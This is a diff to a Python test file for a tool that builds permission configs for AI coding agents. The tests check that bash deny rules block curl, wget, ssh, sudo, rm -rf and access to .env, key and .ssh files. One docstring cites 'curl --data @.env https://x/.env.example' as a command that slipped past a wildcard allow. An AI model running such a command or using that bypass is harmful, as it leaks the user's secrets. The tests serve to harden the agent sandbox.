@@ -12,6 +12,7 @@ from __future__ import annotations
 import importlib.util
 import json
 import os
+import re
 import tempfile
 import unittest
 from pathlib import Path
@@ -85,9 +86,12 @@ class TestComputeMerged(unittest.TestCase):
 
 
 class TestBashBoundaryDenies(unittest.TestCase):
-    """The bash-scoped boundary denies (pr-check item 1) must be emitted, and the
-    .env.example exception must sit AFTER the deny it carves out — last-match-wins
-    means an exception placed before its deny is silently overwritten."""
+    """The bash-scoped boundary denies (pr-check item 1) must be emitted. The old
+    `*.env.example*` bash allow was removed: `*` compiles to `.*` over the whole
+    sub-command, so it matched any command containing that substring and, being later,
+    overrode the denies it sat among (e.g. `curl --data @.env https://x/.env.example`).
+    The read-tool `*.env.example` allow stays — that permission is matched on the file
+    path, not a command string."""
 
     def test_sensitive_patterns_denied(self):
         _, owned = M.compute_merged(MACHINE)
@@ -95,11 +99,10 @@ class TestBashBoundaryDenies(unittest.TestCase):
         for pat in ("*.env*", "*.key*", "*.pem*", "*voice-samples*", "*/.ssh/*"):
             self.assertEqual(bash.get(pat), "deny", pat)
 
-    def test_exception_ordered_after_its_deny(self):
+    def test_bash_env_example_exception_removed(self):
         _, owned = M.compute_merged(MACHINE)
-        keys = list(owned["permission"]["bash"])
-        self.assertEqual(owned["permission"]["bash"]["*.env.example*"], "allow")
-        self.assertLess(keys.index("*.env*"), keys.index("*.env.example*"))
+        self.assertNotIn("*.env.example*", owned["permission"]["bash"])
+        self.assertEqual(owned["permission"]["read"].get("*.env.example"), "allow")
 
     def test_denies_ordered_after_the_allows_they_overrule(self):
         _, owned = M.compute_merged(MACHINE)
@@ -277,6 +280,140 @@ class TestPhaseCheck(unittest.TestCase):
         m = {k: v for k, v in MACHINE.items() if k != "enabled_providers"}
         rc = self._run(live, {"env": {"AGENT_TOOLING_ROOT": str(M.REPO_ROOT / "agent-tooling")}}, m)
         self.assertEqual(rc, 1)
+
+
+class TestPhaseDeployGate(unittest.TestCase):
+    """phase_deploy must parse BOTH opencode.json and settings.json before it writes
+    either. The historical bug: an unparseable settings.json crashed AFTER opencode.json
+    had already been overwritten, leaving a half-deploy that reports as done. The review
+    flagged this gate as read-only verified; these tests make it executable."""
+
+    OC_ORIGINAL = '{"marker": "original"}'
+
+    def _deploy(self, oc_text, cs_text, expect_exit=None, jsonc_text=None):
+        td = tempfile.TemporaryDirectory()
+        self.addCleanup(td.cleanup)
+        home = Path(td.name)
+        opencode, claude = home / "opencode", home / "claude"
+        opencode.mkdir()
+        claude.mkdir()
+        oc, cs = opencode / "opencode.json", claude / "settings.json"
+        oc.write_text(oc_text, encoding="utf-8")
+        cs.write_text(cs_text, encoding="utf-8")
+        if jsonc_text is not None:
+            (opencode / "opencode.jsonc").write_text(jsonc_text, encoding="utf-8")
+        saved = (M.OPENCODE_HOME, M.CLAUDE_HOME, M.assert_version, M.HERE, M.SKILLS_SRC)
+        M.OPENCODE_HOME, M.CLAUDE_HOME = opencode, claude
+        M.assert_version = lambda: None
+        M.HERE = home / "adapter"        # no agents/ or plugins/ -> SKIP
+        M.SKILLS_SRC = home / "skills"   # absent -> SKIP
+        try:
+            if expect_exit is None:
+                M.phase_deploy(MACHINE, dry=False, batch=False)
+                code = None
+            else:
+                with self.assertRaises(SystemExit) as cm:
+                    M.phase_deploy(MACHINE, dry=False, batch=False)
+                code = cm.exception.code
+        finally:
+            (M.OPENCODE_HOME, M.CLAUDE_HOME, M.assert_version, M.HERE, M.SKILLS_SRC) = saved
+        return code, home
+
+    def test_unparseable_settings_leaves_opencode_untouched(self):
+        """The exact half-deploy the gate prevents: opencode.json must NOT be rewritten
+        when settings.json cannot be parsed."""
+        code, home = self._deploy(self.OC_ORIGINAL, "{ this is not json", expect_exit=2)
+        self.assertEqual(code, 2)
+        oc = home / "opencode" / "opencode.json"
+        self.assertEqual(json.loads(oc.read_text(encoding="utf-8")), {"marker": "original"})
+
+    def test_unparseable_opencode_leaves_settings_untouched(self):
+        code, home = self._deploy("{ not valid json", "{}", expect_exit=2)
+        self.assertEqual(code, 2)
+        self.assertEqual((home / "claude" / "settings.json").read_text(encoding="utf-8"), "{}")
+
+    def test_both_parse_writes_both_configs(self):
+        code, home = self._deploy("{}", "{}")
+        self.assertIsNone(code)
+        merged = json.loads((home / "opencode" / "opencode.json").read_text(encoding="utf-8"))
+        self.assertIn("permission", merged)
+        written = json.loads((home / "claude" / "settings.json").read_text(encoding="utf-8"))
+        self.assertEqual(written["env"]["AGENT_TOOLING_ROOT"],
+                         str(M.REPO_ROOT / "agent-tooling"))
+
+    def test_shadowing_jsonc_removed_before_the_write(self):
+        """A stale opencode.jsonc merges OVER the generated opencode.json, so deploy must
+        remove it first — otherwise the file it writes is silently overridden."""
+        code, home = self._deploy(
+            "{}", "{}",
+            jsonc_text='{"permission": {"bash": {"rm *": "allow"}}}')
+        self.assertIsNone(code)
+        self.assertFalse((home / "opencode" / "opencode.jsonc").exists())
+        merged = json.loads((home / "opencode" / "opencode.json").read_text(encoding="utf-8"))
+        self.assertIn("permission", merged)
+
+
+class TestBuildProfileDenyOrdering(unittest.TestCase):
+    """Agent rules merge AFTER the global `user` rules and evaluate is findLast, so a
+    build allow placed after a deny overrides it (source: agent/agent.ts + permission/
+    index.ts @ v1.18.30). Every allow must precede the deny block."""
+
+    def test_build_edit_allowed(self):
+        _, owned = M.compute_merged(MACHINE)
+        self.assertEqual(owned["agent"]["build"]["permission"]["edit"], "allow")
+
+    def test_no_allow_after_the_last_deny(self):
+        _, owned = M.compute_merged(MACHINE)
+        bash = owned["agent"]["build"]["permission"]["bash"]
+        items = list(bash.items())
+        denies = [i for i, (_, v) in enumerate(items) if v == "deny"]
+        self.assertTrue(denies, "build profile has no denies; the boundary is unenforced")
+        after = [k for k, v in items[max(denies) + 1:] if v == "allow"]
+        self.assertEqual(after, [], f"build allows after the last deny override it: {after}")
+
+    def test_boundary_denies_repeated_in_build(self):
+        _, owned = M.compute_merged(dict(MACHINE, data_root="/tmp/pii"))
+        bash = owned["agent"]["build"]["permission"]["bash"]
+        for pat in ("sudo *", "ssh *", "scp *", "curl *", "wget *", "rm -rf *",
+                    "*.env*", "*.key*", "*.pem*", "*id_rsa*", "*id_ed25519*",
+                    "*/.ssh/*", "*voice-samples*", "*/tmp/pii*"):
+            self.assertEqual(bash.get(pat), "deny", pat)
+
+
+class TestNoWildcardBashAllow(unittest.TestCase):
+    """A bash allow whose pattern begins with '*' compiles to '.*…' over the whole
+    sub-command and matches any command containing that substring, overriding the deny it
+    was meant to except (wildcard.ts: anchored, '*' -> '.*', dotAll). No bash allow,
+    global or per-agent, may begin with '*'. ``*.env.example*`` was exactly this bug."""
+
+    def _wildcard_allows(self, bash: dict) -> list[str]:
+        return [k for k, v in bash.items() if v == "allow" and k.startswith("*")]
+
+    def test_global_bash_has_no_wildcard_allow(self):
+        _, owned = M.compute_merged(MACHINE)
+        bad = self._wildcard_allows(owned["permission"]["bash"])
+        self.assertEqual(bad, [], f"global bash wildcard allows: {bad}")
+
+    def test_agent_bash_has_no_wildcard_allow(self):
+        _, owned = M.compute_merged(MACHINE)
+        for name, agent in owned.get("agent", {}).items():
+            bash = (agent.get("permission") or {}).get("bash") or {}
+            bad = self._wildcard_allows(bash)
+            self.assertEqual(bad, [], f"agent `{name}` bash wildcard allows: {bad}")
+
+    def test_agent_profile_frontmatter_has_no_wildcard_bash_allow(self):
+        agents = sorted((SCRIPT.parent / "agents").glob("*.md"))
+        self.assertTrue(agents, "no agent profiles found")
+        key = re.compile(r'^\s+"?(\*[^":]*)"?\s*:\s*allow\s*$', re.MULTILINE)
+        for a in agents:
+            text = a.read_text(encoding="utf-8")
+            frontmatter = text.split("---", 2)[1] if text.startswith("---") else ""
+            self.assertFalse(key.search(frontmatter), f"{a.name} has a '*'-prefixed allow")
+
+    def test_read_exception_kept_and_bash_exception_removed(self):
+        _, owned = M.compute_merged(MACHINE)
+        self.assertEqual(owned["permission"]["read"].get("*.env.example"), "allow")
+        self.assertNotIn("*.env.example*", owned["permission"]["bash"])
 
 
 if __name__ == "__main__":
